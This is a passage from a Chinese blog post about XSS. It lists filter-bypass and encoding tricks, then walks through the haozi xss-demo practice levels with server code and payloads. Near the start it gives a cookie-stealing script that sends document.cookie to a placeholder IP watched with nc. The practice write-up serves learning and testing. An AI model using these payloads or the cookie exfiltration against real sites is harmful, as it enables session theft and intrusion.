<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span>标签中可以直接执行实体字符。</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1&amp;#41;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Cookie盗取：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxx.xxx.xxx.xxx:1234/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">nc监听端口1234</span><br></pre></td></tr></table></figure>
<p>Tips:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">- 反引号代替圆括号</span><br><span class="line">- 换行绕过正则</span><br><span class="line">- <span class="comment">&lt;!--不仅可以用--&gt;</span>,也可以用--!&gt;闭合</span><br><span class="line">- //可以用换行来绕过</span><br><span class="line">- <span class="comment">&lt;!--和--&gt;</span>都可以在html的script标签里单独使用进行单行注释</span><br><span class="line">- ſ 符号转换为大写后正好为大写字母 S</span><br><span class="line">- 可以用 %0a 代替空格进行绕过</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="0x03-XSS编码"><a href="#0x03-XSS编码" class="headerlink" title="0x03 XSS编码"></a>0x03 XSS编码</h3><h5 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h5><p>JS提供了四种字符编码的策略，</p>
<ul>
<li>三个八进制数字，如果数字不够，在前面补零，如a的编码为<code>\141</code></li>
<li>两个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\x61</code></li>
<li>四个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\u0061</code></li>
<li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\n</code>和<code>\r</code></li>
</ul>
<h5 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h5><p><strong>命名实体</strong><br>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
<p><strong>字符编码</strong><br>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#</code>数值;</p>
<p>如<code>&lt;</code>的编码为</p>
<p><code>&amp;#60;</code>(10进制)</p>
<p><code>&amp;#x003c;</code>(16进制)</p>
<h5 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h5><p>这里为url全编码，也就是两次url编码</p>
<p>如alert的url全编码<code>为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>
<h5 id="String-fromCharCode编码"><a href="#String-fromCharCode编码" class="headerlink" title="String.fromCharCode编码"></a>String.fromCharCode编码</h5><p>如alert的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p>
<p><br></p>
<h3 id="0x04-刷题"><a href="#0x04-刷题" class="headerlink" title="0x04 刷题"></a>0x04 刷题</h3><h4 id="haozi-xss-demo"><a href="#haozi-xss-demo" class="headerlink" title="haozi-xss-demo"></a>haozi-xss-demo</h4><p>项目：<a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a><br>地址：<a href="https://xss.haozi.me" target="_blank" rel="noopener">https://xss.haozi.me</a><br>包含alert(1)的js文件地址：<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a><br>过关方式：构造input code，成功执行alert(1)</p>
<h6 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h6><p><strong>server code:</strong><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>直接构造js语句即可。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这一关插入的地方在html标签里面，所以要先闭合<code>&lt;textarea&gt;</code>标签，再进行构造。<br><strong>nput code:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>input的地方在尖括号内部，需要先闭合尖括号。<br><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这一关用正则表达式过滤了括号（替换为空），这里有个小tip，可以用反引号代替圆括号。</p>
<p>其他关于过滤圆括号的一些方法，可参考：<a href="https://xz.aliyun.com/t/4936#toc-3" target="_blank" rel="noopener">XSS相关一些个人Tips</a></p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>过滤了圆括号和反引号，所以上一关的方法就不能用了。</p>
<p>可以用各种编码进行绕过，如url编码、html实体编码。</p>
<ul>
<li><code>&lt;svg&gt;</code>标签中可以直接执行实体字符,payload2</li>
<li>h5中<code>iframe</code>标签的<code>srcdoc</code>属性，<code>srcdoc</code>里的代码会作为<code>iframe</code>中的内容显示出来，<code>srcdoc</code>中可以直接去写转译后的html片段,payload3</li>
</ul>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascript:alert%281%29"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40;1&amp;#41;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这一关将html中的注释符<code>--&gt;</code>替换成了一个表情，并且输入的内容是包含在一段注释符里的。</p>
<p>html通常的的注释符为：<code>&lt;!--    --&gt;</code>，测试发现<code>&lt;!- -!&gt;</code>、<code>&lt;!-- --!&gt;</code>同样可已用来注释，这里可利用<code>--!&gt;</code>来闭合。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>过滤了以<code>auto</code>、<code>on</code>开头，<code>=</code>结尾的标签属性，并用下划线<code>_</code>进行替换，同时忽略大小写。</p>
<p>这里可以用换行来绕过正则的检查。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=alert(1)</span><br><span class="line">或</span><br><span class="line">type=image src onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">onmouseover</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span></span></span><br><span class="line"><span class="tag"> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span></span></span><br><span class="line"><span class="tag">=<span class="string">alert(1)</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>正则匹配了以<code>&lt;</code>或<code>&lt;/</code>开头，<code>&gt;</code>或<code>/&gt;</code>结尾的标签，并替换为空。<br>浏览器容错性运行去掉最后面的<code>&gt;</code>，所以可以去掉它来绕过正则。</p>
<p><strong>payload:</strong>(最后还有个空格或回车)<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span></span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span></span></span><br><span class="line">&lt;/article&gt;</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>过滤了<code>&lt;/style&gt;</code>标签，忽略大小写。</p>
<p>因为我们需要用到<code>&lt;/style&gt;</code>来闭合标签，所以依旧可以通过换行绕过正则，或者用<code>&lt;/style &gt;</code>（多加了一个空格），也可以进行绕过。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">style</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      &lt;/style</span></span><br><span class="line"><span class="xml">&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>要求输入的值要以<code>https://www.segmentfault.com</code>开头，否则返回<code>Invalid URL</code></p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>Lethe<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.segmentfault.com"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>Lethe<span class="tag">&lt;/<span class="name">a</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>同样要求输入的值要以<code>https://www.segmentfault.com</code>开头，但是过滤了<code>&amp; &#39; &quot; &lt; &gt; /</code>，这个过滤。</p>
<p>前面给出的包含alert(1)的js文件就派上用场了。</p>
<p>利用URL的@特性引入js，过滤后的html实体编码在html标签属性值中无影响，直接解析。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js</span><br><span class="line"></span><br><span class="line">但是...在这里却不行</span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里将输入值全部转换成了大写。</p>
<ul>
<li>html标签不区分；</li>
<li>域名不区分大小写</li>
<li>js严格区分大小写。</li>
</ul>
<p>因此这里可以利用html标签引用外部js资源，但是这里引用前面给的<a href="https://xss.haozi.me/j.js还是不行，根据官方解答，需要引用https://www.segmentfault.com.haozi.me/j.js这个链接才行...无语。" target="_blank" rel="noopener">https://xss.haozi.me/j.js还是不行，根据官方解答，需要引用https://www.segmentfault.com.haozi.me/j.js这个链接才行...无语。</a></p>
<p>但这里也可利用html实体编码来进行绕过，alert(1)的html实体编码为<code>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</code></p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"X"</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">''</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>将script替换为空，正则全局匹配且不区分大小写.</p>
<p>这里可以直接用上一题的payload…也可以双写script，引用外部js资源，同样还是需要引用<a href="https://www.segmentfault.com.haozi.me/j.js这个链接才行." target="_blank" rel="noopener">https://www.segmentfault.com.haozi.me/j.js这个链接才行.</a>.</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scscriptript</span> <span class="attr">src</span>=<span class="string">"https://www.segmentfault.com.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">"HTTPS://WWW.SEGMENTFAULT.COM.HAOZI.ME/J.JS"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>过滤了<code>&lt; / &quot; &#39;</code>，但input的地方前面有个//，这是js的单行注释符，可以通过换行来绕过，然后再用<code>--&gt;</code>将后面的<code>&#39;)</code>注释掉。</p>
<p>经过我自己的测试，<code>&lt;!--</code>和<code>--&gt;</code>都可以在html的<code>script</code>标签里单独使用进行单行注释.，这里<code>&lt;</code>被过滤了，所以使用<code>--&gt;</code></p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(1);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>html:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">          <span class="comment">// alert('</span></span></span><br><span class="line"><span class="undefined">alert(1);</span></span><br><span class="line"><span class="undefined">--&gt;')</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h6 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h6><p><strong>server code:</strong><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>匹配以<code>&lt;</code>起始的字符，替换为<code>&lt;_$1</code>，并且把输入转换为大写，这样这样的标签就都用不了了。</p>
<p>这里有个<strong>tip</strong>：<br>发现了一个<code>ſ</code>字符，是古英语中<code>s</code>的写法，但现在不会当作英文字母a-zA-Z，关键是<code>ſ</code>转换为大写后正好为<code>S</code>，这样就可以绕过正则使用<code>&lt;script&gt;</code>标签引如外部js。</p>
<p><strong>payload:</strong><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">src</span>=<span class="string">"https://www.segmentfault.com.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
